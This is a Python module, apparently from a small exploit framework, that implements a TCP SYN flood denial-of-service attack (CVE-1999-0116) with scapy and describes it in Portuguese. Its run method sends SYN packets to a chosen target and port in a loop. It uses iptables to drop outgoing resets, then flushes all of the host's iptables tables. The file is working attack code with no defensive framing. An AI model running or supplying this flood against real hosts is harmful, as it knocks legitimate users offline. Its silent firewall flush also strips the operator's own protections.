from scapy.all import *

class exploit:
  _name = "TCP SYN floon (CVE-1999-0116)"
  _descriptions = ''' 
Este modulo explora uma vulnerabilidade encontrada em diversos sistemas operacionais publicada
em 19/09/1996. Ao imundar um alvo com pacotes TCP SYS sem responder com ACKs para concluir o handshake,
o buffer do servidor fica cheio de conexÃµes meio abertas causando um Dos para clientes legÃ­timos.
  '''
  _references = """
https://www.cvedetails.com/cve/CVE-1999-0116 
  """
  _port = None
  _interval = None

  def __init__(self):
    self._port = 1234
    self._interval = 1.0
  def run(self, target):
    print("Run exploit ...")
    pkt = IP( dst=target,id=1111,ttl=99)/TCP(sport=RandShort(),dport=self._port,seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
    ls(pkt)
    os.system("iptables -A OUTPUT -p tcp -s " + pkt.src + " --tcp-flags RST RST -j DROP")
    print("Sending Packets in %f second intervals for timeout of 4 sec" %(self._interval))
    srloop(pkt,inter=self._interval,retry=2,timeout=4)
    os.system("iptables -t filter -F; sudo iptables -t nat -F;sudo iptables -t mangle -F")

  def show_details(self):
    print("""
Name:
............
%s

Description:
.............
%s

References:
............
%s
""" %(self._name, self._descriptions, self._references))

  def show_options(self):
    print("""
Options:
........
Name      Value             Descriptions
....      .....             ............
port      %d                The destination port to send.
interval  %f                Send packets interval.
""" % (self._port, self._interval))
  
  def set_options(self, command_str):
    if "port" in command_str:
      port = int(command_str.replace("port ", ""))
      if port >= 0 and port <= 65535:
        self._port = port
      else:
        print("%d: invalid port")
    elif "interval" in command_str:
      interval = float(command_str.replace("interval ", ""))
      if interval > 0 and interval < 4:
        self._interval = interval
      else:
        print("%f: invalid interval")
    else:
      print("%s: invalid option" %command_str)
  